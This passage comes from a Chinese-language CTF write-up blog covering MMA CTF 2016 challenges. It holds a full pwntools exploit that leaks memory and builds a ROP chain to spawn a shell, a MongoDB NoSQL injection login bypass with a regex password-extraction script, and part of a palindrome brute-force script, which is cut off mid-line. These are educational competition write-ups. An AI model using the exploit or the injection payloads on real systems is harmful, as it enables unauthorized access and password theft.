class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&quot;pwn1.chal.ctf.westerns.tokyo&quot;</span> </span><br><span class="line">PORT = <span class="number">62839</span></span><br><span class="line">ELF_PATH = <span class="string">&quot;./befunge_patch&quot;</span></span><br><span class="line">LIBC_PATH = <span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># setting </span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.endian = <span class="string">&#x27;little&#x27;</span></span><br><span class="line">context.word_size = <span class="number">32</span></span><br><span class="line">context.log_level = <span class="string">&#x27;INFO&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(ELF_PATH)</span><br><span class="line">libc = ELF(LIBC_PATH)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">myexec</span>(<span class="params">cmd</span>):</span><br><span class="line">    <span class="keyword">return</span> subprocess.check_output(cmd, shell=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">str_addr</span>(<span class="params">s, f</span>): <span class="comment"># search string address in file</span></span><br><span class="line">    result = <span class="built_in">list</span>(f.search(s+<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">len</span>(result): <span class="comment"># no result</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> result[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_one_byte</span>(<span class="params">off_1, off_80</span>):</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(off_1))</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(off_80))</span><br><span class="line">    ret = r.recvuntil(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(ret)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_addr</span>(<span class="params">base, off_80, name=<span class="literal">None</span></span>):</span><br><span class="line">    ret_addr = <span class="number">0</span></span><br><span class="line">    cnt = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(base, base+<span class="number">6</span>):</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;leaking %s byte : %d&quot;</span> % (name, cnt+<span class="number">1</span>)</span><br><span class="line">        ret = leak_one_byte(i, off_80)</span><br><span class="line">        ret_addr = ret_addr | ((ret&amp;<span class="number">0xff</span>) &lt;&lt; <span class="number">8</span>*cnt)</span><br><span class="line">        cnt += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret_addr</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cal_offset</span>(<span class="params">addr, text_base</span>):</span><br><span class="line">    start_from = text_base + <span class="number">0x202040</span></span><br><span class="line">    offset = addr - start_from</span><br><span class="line">    off_80 = offset/<span class="number">80</span></span><br><span class="line">    off_1 = offset%<span class="number">80</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> off_1, off_80</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_far_addr</span>(<span class="params">addr, text_base, name</span>):</span><br><span class="line">    ret_addr = <span class="number">0</span></span><br><span class="line">    cnt = <span class="number">0</span></span><br><span class="line">    off_1, off_80 = cal_offset(addr, text_base)</span><br><span class="line">    temp = <span class="built_in">int</span>(math.sqrt(off_80))</span><br><span class="line">    off_1 = (off_80 - temp**<span class="number">2</span>)*<span class="number">80</span> + off_1</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(off_1, off_1+<span class="number">6</span>):</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;leaking %s byte : %d&quot;</span> % (name, cnt+<span class="number">1</span>)</span><br><span class="line">        r.sendline(<span class="built_in">str</span>(i))</span><br><span class="line">        r.sendline(<span class="built_in">str</span>(temp))</span><br><span class="line">        r.sendline(<span class="built_in">str</span>(temp))</span><br><span class="line">        ret = <span class="built_in">int</span>(r.recvuntil(<span class="string">&quot; &quot;</span>))</span><br><span class="line">        ret_addr = ret_addr | ((ret&amp;<span class="number">0xff</span>) &lt;&lt; <span class="number">8</span>*cnt)</span><br><span class="line">        cnt += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret_addr</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_far_addr</span>(<span class="params">addr, text_base, name, value</span>):</span><br><span class="line">    cnt = <span class="number">0</span></span><br><span class="line">    off_1, off_80 = cal_offset(addr, text_base)</span><br><span class="line">    temp = <span class="built_in">int</span>(math.sqrt(off_80))</span><br><span class="line">    off_1 = (off_80 - temp**<span class="number">2</span>)*<span class="number">80</span> + off_1</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(off_1, off_1+<span class="number">6</span>):</span><br><span class="line">        v = (value&gt;&gt;(<span class="number">8</span>*cnt)) &amp; <span class="number">0xff</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;writing %s byte %d : %x&quot;</span> % (name, cnt+<span class="number">1</span>, v)</span><br><span class="line">        r.sendline(<span class="built_in">str</span>(v))</span><br><span class="line">        r.sendline(<span class="built_in">str</span>(i))</span><br><span class="line">        r.sendline(<span class="built_in">str</span>(temp))</span><br><span class="line">        r.sendline(<span class="built_in">str</span>(temp))</span><br><span class="line">        cnt += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#LOCAL = True</span></span><br><span class="line">    LOCAL = <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># construct befunge-93 program</span></span><br><span class="line">    preline = myexec(<span class="string">&quot;wc -l ./bbb | awk &#x27;&#123;print $1&#125;&#x27;&quot;</span>)</span><br><span class="line">    preline = <span class="built_in">int</span>(preline)</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;./bbb&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">    s = f.read()</span><br><span class="line">    s += <span class="string">&quot;\n&quot;</span>*(<span class="number">80</span>-preline)</span><br><span class="line">    </span><br><span class="line">    r, LD = <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> LOCAL:</span><br><span class="line">        r = remote(HOST, PORT)</span><br><span class="line">        LD = ELF(<span class="string">&quot;/mnt/files/ld-linux-x86-64.so.2&quot;</span>) <span class="comment"># ubuntu 14.04 64 bit ld-linux</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = process(ELF_PATH)</span><br><span class="line">        LD = ELF(<span class="string">&quot;/lib64/ld-linux-x86-64.so.2&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># send program</span></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, s)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;&gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak libc</span></span><br><span class="line">    libc_main = leak_addr(-<span class="number">48</span>, -<span class="number">2</span>, <span class="string">&quot;libc_main&quot;</span>)</span><br><span class="line">    libc_base, system, bin_sh = <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line">    <span class="comment"># for local</span></span><br><span class="line">    <span class="keyword">if</span> LOCAL:</span><br><span class="line">        libc.address += libc_main - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">        libc_base = libc.address</span><br><span class="line">        system = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">        bin_sh = str_addr(<span class="string">&quot;sh\x00&quot;</span>, libc)</span><br><span class="line">    <span class="comment"># for remote</span></span><br><span class="line">    <span class="keyword">else</span>: </span><br><span class="line">        libc_base = libc_main - <span class="number">0x21e50</span></span><br><span class="line">        system = libc_base + <span class="number">0x0000000000046590</span></span><br><span class="line">        bin_sh = libc_base + <span class="number">0x17c8c3</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak text base</span></span><br><span class="line">    text_base = leak_addr(-<span class="number">56</span>, -<span class="number">9</span>, <span class="string">&quot;text_base&quot;</span>)</span><br><span class="line">    text_base -= <span class="number">0xb00</span></span><br><span class="line"></span><br><span class="line">    log.info(<span class="string">&quot;libc_base: &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">    log.info(<span class="string">&quot;text_base: &quot;</span>+<span class="built_in">hex</span>(text_base))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># leak r_debug</span></span><br><span class="line">    r_debug = leak_addr(<span class="number">0</span>, -<span class="number">7</span>, <span class="string">&quot;r_debug&quot;</span>)</span><br><span class="line">    log.info(<span class="string">&quot;r_debug: &quot;</span>+<span class="built_in">hex</span>(r_debug))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># traverse link_map structure &amp; leak ld-linux.so base address</span></span><br><span class="line">    link_map_addr = r_debug + <span class="number">8</span></span><br><span class="line">    link_map_text = leak_far_addr(link_map_addr, text_base, <span class="string">&quot;link_map_text&quot;</span>)</span><br><span class="line">    log.info(<span class="string">&quot;link_map_text: &quot;</span>+<span class="built_in">hex</span>(link_map_text))</span><br><span class="line">    link_map_vdso = leak_far_addr(link_map_text+<span class="number">24</span>, text_base, <span class="string">&quot;link_map_vdso&quot;</span>)</span><br><span class="line">    log.info(<span class="string">&quot;link_map_vdso: &quot;</span>+<span class="built_in">hex</span>(link_map_vdso))</span><br><span class="line">    link_map_libc = leak_far_addr(link_map_vdso+<span class="number">24</span>, text_base, <span class="string">&quot;link_map_libc&quot;</span>)</span><br><span class="line">    log.info(<span class="string">&quot;link_map_libc: &quot;</span>+<span class="built_in">hex</span>(link_map_libc))</span><br><span class="line">    link_map_ld = leak_far_addr(link_map_libc+<span class="number">24</span>, text_base, <span class="string">&quot;link_map_ld&quot;</span>)</span><br><span class="line">    log.info(<span class="string">&quot;link_map_ld: &quot;</span>+<span class="built_in">hex</span>(link_map_ld))</span><br><span class="line">    ld_base = leak_far_addr(link_map_ld, text_base, <span class="string">&quot;ld_base&quot;</span>)</span><br><span class="line">    log.info(<span class="string">&quot;ld_base: &quot;</span>+<span class="built_in">hex</span>(ld_base))</span><br><span class="line">    <span class="comment"># leak __libc_stack_end in ld-linux.so, get stack address</span></span><br><span class="line">    LD.address += ld_base</span><br><span class="line">    log.info(<span class="string">&quot;libc_stack_end: &quot;</span>+<span class="built_in">hex</span>(LD.symbols[<span class="string">&#x27;__libc_stack_end&#x27;</span>]))</span><br><span class="line">    stack_addr = leak_far_addr(LD.symbols[<span class="string">&#x27;__libc_stack_end&#x27;</span>], text_base, <span class="string">&quot;stack addr&quot;</span>)</span><br><span class="line">    log.info(<span class="string">&quot;stack_addr: &quot;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">    </span><br><span class="line">    pop_rdi = text_base + <span class="number">0x000000000000120c</span></span><br><span class="line">    ret_addr = stack_addr - <span class="number">216</span></span><br><span class="line">    log.info(<span class="string">&quot;ret_addr: &quot;</span>+<span class="built_in">hex</span>(ret_addr))</span><br><span class="line">    log.info(<span class="string">&quot;pop_rdi: &quot;</span>+<span class="built_in">hex</span>(pop_rdi))</span><br><span class="line">    log.info(<span class="string">&quot;bin_sh: &quot;</span>+<span class="built_in">hex</span>(bin_sh))</span><br><span class="line">    log.info(<span class="string">&quot;system: &quot;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># overwrite return address</span></span><br><span class="line">    write_far_addr(ret_addr, text_base, <span class="string">&quot;ret_addr&quot;</span>, pop_rdi)</span><br><span class="line">    write_far_addr(ret_addr+<span class="number">8</span>, text_base, <span class="string">&quot;ret_addr+8&quot;</span>, bin_sh)</span><br><span class="line">    write_far_addr(ret_addr+<span class="number">16</span>, text_base, <span class="string">&quot;ret_addr+16&quot;</span>, system)</span><br><span class="line"></span><br><span class="line">    r.interactive()</span><br></pre></td></tr></table></figure>
+<p><code>bbb</code> 這個檔案是要給程式的 Befunge-93 instruction:  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&gt;                                    v</span><br><span class="line">v.g&amp;&amp;.g&amp;&amp;.g&amp;&amp;.g&amp;&amp;.g&amp;&amp;.g&amp;&amp;            &lt;</span><br><span class="line">&gt;&amp;&amp;g.&amp;&amp;g.&amp;&amp;g.&amp;&amp;g.&amp;&amp;g.&amp;&amp;g.            v</span><br><span class="line">v.g&amp;&amp;.g&amp;&amp;.g&amp;&amp;.g&amp;&amp;.g&amp;&amp;.g&amp;&amp;            &lt;</span><br><span class="line">&gt;&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.v </span><br><span class="line">v                                    &lt;</span><br><span class="line">&gt;&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.v </span><br><span class="line">v                                    &lt;</span><br><span class="line">&gt;&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.v </span><br><span class="line">v                                    &lt;</span><br><span class="line">&gt;&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.v </span><br><span class="line">v                                    &lt;</span><br><span class="line">&gt;&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.v </span><br><span class="line">v                                    &lt;</span><br><span class="line">&gt;&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.v </span><br><span class="line">v                                    &lt;</span><br><span class="line">&gt;&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*pv</span><br><span class="line">v                                    &lt; </span><br><span class="line">&gt;&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*pv</span><br><span class="line">v                                    &lt; </span><br><span class="line">&gt;&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*pv</span><br><span class="line">v                                    &lt; </span><br><span class="line">&gt;                                    ^</span><br></pre></td></tr></table></figure>
+<p>可以看到最後有個無限迴圈，為的是要讓程式執行到最後跳出 do-while 迴圈，之後跑到 main 的結尾來做 ret，接上我們的 ROP chain。</p>
+<p>跑起來大概長的像這樣:</p>
+<pre>
+leaking libc_main byte : 1
+leaking libc_main byte : 2
+leaking libc_main byte : 3
+................
+writing ret_addr+16 byte 5 : b4
+writing ret_addr+16 byte 6 : 7f
+[*] Switching to interactive mode
+Too many steps. Is there any infinite loops?
+// ls
+befunge
+flag
+// cat flag
+TWCTF{It_1s_eMerG3nCy}
+[*] Closed connection to pwn1.chal.ctf.westerns.tokyo port 62839
+</pre>  
+<p>flag: <code>TWCTF&#123;It_1s_eMerG3nCy&#125;</code></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2016/09/06/MMA-CTF-2nd-2016-Get-the-admin-password-100/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="逐流小站">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2016/09/06/MMA-CTF-2nd-2016-Get-the-admin-password-100/" itemprop="url">[MMA CTF 2nd 2016] Get the admin password 100</a></h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-09-06T00:45:00+08:00">
+                2016-09-06
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/write-ups/" itemprop="url" rel="index">
+                    <span itemprop="name">write-ups</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
+     crossorigin="anonymous"></script>
+<ins class="adsbygoogle"
+     style="display:block; text-align:center;"
+     data-ad-layout="in-article"
+     data-ad-format="fluid"
+     data-ad-client="ca-pub-4522670236044605"
+     data-ad-slot="5167312561"></ins>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+      
+      
+
+      
+        
+        
+          
+            <h1 id="漏洞解析"><a href="#漏洞解析" class="headerlink" title="漏洞解析"></a>漏洞解析</h1><p>感謝隊友 Ann Tsai 試出來漏洞</p>
+<p>我這裡負責剪尾刀把 script 寫完</p>
+<p>大概試了一下可以發現漏洞是 sql injection </p>
+<p>只是由於 database 是 nosql 稍微有點不一樣</p>
+<p>相關內容可以參考以下的這篇文章</p>
+<p><a target="_blank" rel="noopener" href="https://www.idontplaydarts.com/2010/07/mongodb-is-vulnerable-to-sql-injection-in-php-at-least/">https://www.idontplaydarts.com/2010/07/mongodb-is-vulnerable-to-sql-injection-in-php-at-least/</a></p>
+<p>POST <a target="_blank" rel="noopener" href="http://gap.chal.ctf.westerns.tokyo/login.php">http://gap.chal.ctf.westerns.tokyo/login.php</a></p>
+<p>user&#x3D;admin&amp;password[$ne]&#x3D;true&amp;submit&#x3D;true</p>
+<p>就能夠成功登入</p>
+<p><code>$ne</code> 是 <code>not equal</code> operator</p>
+<p>所以說要是資料庫裡的 password not equal 輸入的 password</p>
+<p>就能夠成功登入</p>
+<p>接下來的 payload 就會利用控制 operator 的方式爆出密碼</p>
+<h1 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h1><p>mongoDB 可以使用的 operator 可以參考以下連結</p>
+<p><a target="_blank" rel="noopener" href="https://docs.mongodb.com/manual/reference/operator/query/">https://docs.mongodb.com/manual/reference/operator/query/</a></p>
+<p>在這裡我使用的 <code>regex</code> operator</p>
+<p>想法是 <code>regex</code> 的 pattern 使用 <code>^TWCTF&#123;</code> </p>
+<p>代表 <code>TMCTF&#123;</code> 開頭的字串</p>
+<p>然後一個一個字元加 把 flag 爆出來</p>
+<p>注意一下跳脫字元即可</p>
+<p>payload 如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">import re</span><br><span class="line">url = &#x27;http://gap.chal.ctf.westerns.tokyo/login.php&#x27;</span><br><span class="line">flag = &#x27;^TWCTF&#123;&#x27;</span><br><span class="line">print(string.printable)</span><br><span class="line">while True:</span><br><span class="line">    for c in string.printable:</span><br><span class="line">        qq = flag+re.escape(c)</span><br><span class="line">        print(qq)</span><br><span class="line">        payload = &#123;&#x27;user&#x27;: &#x27;admin&#x27;, &#x27;password[$regex]&#x27;: qq,&#x27;submit&#x27;: True&#125;</span><br><span class="line">        r = requests.post(url,payload)</span><br><span class="line">        if &#x27;TWCTF&#123;...&#125;&#x27; in r.text:</span><br><span class="line">            flag+=c</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
+
+<h1 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TWCTF&#123;wasshoi!summer_festival!&#125;</span><br></pre></td></tr></table></figure>
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2016/09/05/MMA-CTF-2nd-2016-Make-a-Palindrome-50/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="逐流小站">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2016/09/05/MMA-CTF-2nd-2016-Make-a-Palindrome-50/" itemprop="url">[MMA CTF 2nd 2016] Make a Palindrome 50</a></h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-09-05T16:18:00+08:00">
+                2016-09-05
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/write-ups/" itemprop="url" rel="index">
+                    <span itemprop="name">write-ups</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
+     crossorigin="anonymous"></script>
+<ins class="adsbygoogle"
+     style="display:block; text-align:center;"
+     data-ad-layout="in-article"
+     data-ad-format="fluid"
+     data-ad-client="ca-pub-4522670236044605"
+     data-ad-slot="5167312561"></ins>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+      
+      
+
+      
+        
+        
+          
+            <h1 id="MMA-CTF-2nd-2016-Make-a-Palindrome-50"><a href="#MMA-CTF-2nd-2016-Make-a-Palindrome-50" class="headerlink" title="[MMA CTF 2nd 2016] Make a Palindrome 50"></a>[MMA CTF 2nd 2016] Make a Palindrome 50</h1><blockquote>
+<p>Category: PPC<br>Point: 50<br>Solver: 0Alien0 @ BambooFox</p>
+</blockquote>
+<h2 id="Make-a-Palindrome"><a href="#Make-a-Palindrome" class="headerlink" title="Make a Palindrome"></a>Make a Palindrome</h2><p>這題分兩個階段</p>
+<p>只要答對第一題就可以拿到第一階段的 flag</p>
+<p>答對剩下的題目則可以拿到第二階段的 flag</p>
+<p>題目是他給你好幾個單字要你拼成回文字</p>
+<p>b bba ab cc -&gt; ab b cc bba 也就是 abbccbba</p>
+<p>我想說先用暴力解解看(畢竟這只是 warm up 題)</p>
+<p>然後就過了O_O(發現最大也才 10 個字 3628800 種可能而已 一塊蛋糕)</p>
+<h3 id="使用工具"><a href="#使用工具" class="headerlink" title="使用工具 :"></a>使用工具 :</h3><p>pwn -&gt; 連線</p>
+<p>itertools -&gt; 產生所有可能</p>
+<h3 id="解題流程"><a href="#解題流程" class="headerlink" title="解題流程 :"></a>解題流程 :</h3><p>產生所有可能的字串 -&gt; 檢查是不是回文 -&gt; 答案</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isPalindrome</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)/<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">if</span> s[i] != s[<span class="built_in">len</span>(s)-<span class="number">1</span>-i]:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;ppc1.chal.ctf.westerns.tokyo&quot;</span></span><br><span class="line">port = <span class="number">31111</span></span><br><span class="line"></span><br><span class="line">s = remote(ip,port)</span><br><span class="line"><span class="built_in">print</span> s.recv()</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;================&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    inp = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        inp = 